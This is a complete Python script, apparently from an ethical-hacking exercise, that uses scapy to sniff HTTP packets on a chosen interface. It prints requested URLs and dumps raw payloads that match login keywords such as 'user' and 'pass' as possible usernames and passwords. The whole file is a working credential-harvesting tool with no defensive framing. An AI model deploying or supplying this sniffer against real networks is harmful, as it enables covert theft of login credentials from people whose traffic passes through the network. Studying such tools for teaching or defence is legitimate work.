#!/bin/python3


# Import of the libraries
import scapy.all as scapy
from scapy.layers import http
import argparse


# Set interface
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Interface to sniff packets')
    options = parser.parse_args()
    if not options.interface:
        parser.error('\n[-] Please specify an interface, use --help for more info.')
    return options


# Packet capturing
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Extracts and prints URLs
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# Extracts and prints possible login information
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['User', 'user', 'nick', 'login', 'Login', 'Password', 'pass', ]
        for keyword in keywords:
            if keyword in str(load):
                return load


# Analysis of captured packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request >> ' + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username or password >> ' + str(login_info) + '\n\n')


options = get_arguments()
sniff(options.interface)
